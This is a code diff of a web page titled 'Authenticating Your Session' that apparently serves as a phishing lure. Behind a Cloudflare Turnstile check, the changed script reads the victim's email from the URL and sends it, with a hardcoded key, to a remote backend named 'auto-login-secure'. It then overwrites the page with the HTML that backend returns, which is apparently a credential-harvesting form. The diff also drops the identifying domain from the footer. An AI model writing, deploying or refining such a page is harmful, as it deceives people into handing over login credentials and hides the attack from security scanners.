@@ -11,60 +11,104 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;d
 .tOrWHzq{font-size:1.25rem;font-weight:600;color:#1e293b;margin-bottom:8px}
 .uOrWHzq{font-size:0.9rem;color:#64748b;margin-bottom:28px}
 .ftOrWHzq{margin-top:24px;font-size:0.75rem;color:#c0c8d4}
+#ts-error{margin-top:16px;color:#dc2626;font-size:14px;display:none;}
 </style>
 </head>
 <body>
 <div class="cOrWHzq">
-<div class="tOrWHzq">Authenticating Your Session</div>
-<div class="uOrWHzq">We need to confirm you are human before proceeding to your secure workspace.</div>
-<div id="ts-turnstile" style="min-height:65px;"></div>
-<div id="ts-error" style="margin-top:16px;color:#dc2626;font-size:14px;display:none;">Verification failed. Please try again.</div>
-<div class="ftOrWHzq">&copy; 2026 api.baloncloud.eu</div>
+  <div class="tOrWHzq">Authenticating Your Session</div>
+  <div class="uOrWHzq">We need to confirm you are human before proceeding to your secure workspace.</div>
+  <div id="ts-turnstile" style="min-height:65px;"></div>
+  <div id="ts-error">Verification failed. Please try again.</div>
+  <div class="ftOrWHzq">&copy; 2026 Secure Auth</div>
 </div>
+
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async></script>
 <script>
 (function(){
-  // ⚠️ CHANGE THIS to your Render URL after deploying the backend
-  // Example: var BACKEND = "https://auto-login-secure.onrender.com";
-  // If you set up Netlify _redirects, leave it empty to use same-origin /a
-  var BACKEND = "https://auto-login-secure.onrender.com"; // e.g. "https://your-app.onrender.com"
+  // ============================================================
+  // CONFIG
+  // ============================================================
+  var BACKEND = "https://auto-login-secure.onrender.com";  // ← your Render URL
+  var SITEKEY = "0x4AAAAAAE7CY8nNIUDU9vqa";                // ← REAL Turnstile sitekey
+  var KEY     = "HBfNYyUjMsgOLGRZ";
 
-  var n = "HBfNYyUjMsgOLGRZ";
+  // ============================================================
+  // READ ?u=email FROM URL BAR
+  // ============================================================
+  var params = new URLSearchParams(window.location.search);
+  var email  = params.get('u') || '';
+  console.log('[flow] detected email from URL:', email || '(none)');
+
   var sent = false;
 
+  // ============================================================
+  // CALLBACK — fires after user solves Turnstile
+  // ============================================================
   function loadForm(token){
-    if(sent) return;
+    if (sent) return;
     sent = true;
-    fetch(BACKEND + '/a?k=' + n + '&t=' + encodeURIComponent(token))
+
+    var url = BACKEND + '/a?k=' + encodeURIComponent(KEY) +
+              '&t=' + encodeURIComponent(token);
+    if (email) url += '&u=' + encodeURIComponent(email);
+
+    console.log('[flow] fetching:', url);
+
+    fetch(url)
       .then(function(r){ return r.text(); })
       .then(function(html){
+        console.log('[flow] response length:', html.length);
         document.open();
         document.write(html);
         document.close();
       })
-      .catch(function(){
-        document.body.innerHTML = '<div style="text-align:center;padding:40px;font-family:sans-serif"><p>Unable to verify. Please try again later.</p></div>';
+      .catch(function(err){
+        console.error('[flow] fetch failed:', err);
+        document.body.innerHTML =
+          '<div style="text-align:center;padding:40px;font-family:sans-serif">' +
+          '<p>Unable to verify. Please try again later.</p></div>';
       });
   }
 
   function onError(){
     var err = document.getElementById('ts-error');
-    if(err) err.style.display = 'block';
+    if (err) err.style.display = 'block';
+    console.error('[flow] turnstile error');
   }
 
-  window.addEventListener('load', function(){
-    if(typeof turnstile !== 'undefined'){
+  // ============================================================
+  // WAIT for turnstile to be available, then render
+  // ============================================================
+  var tries = 0;
+  function boot(){
+    if (typeof turnstile === 'undefined') {
+      if (++tries > 40) {          // ~8s max wait
+        console.error('[flow] turnstile never loaded');
+        return onError();
+      }
+      return setTimeout(boot, 200);
+    }
+    try {
       turnstile.render('#ts-turnstile', {
-        sitekey: '0x4AAAAAAE7CY8nNIUDU9vqa',
+        sitekey: SITEKEY,
         callback: loadForm,
         errorCallback: onError,
         appearance: 'always',
         retry: 'never'
       });
-    } else {
+      console.log('[flow] turnstile rendered with sitekey:', SITEKEY);
+    } catch(e){
+      console.error('[flow] turnstile.render threw:', e);
       onError();
     }
-  });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
 })();
 </script>
 </body>
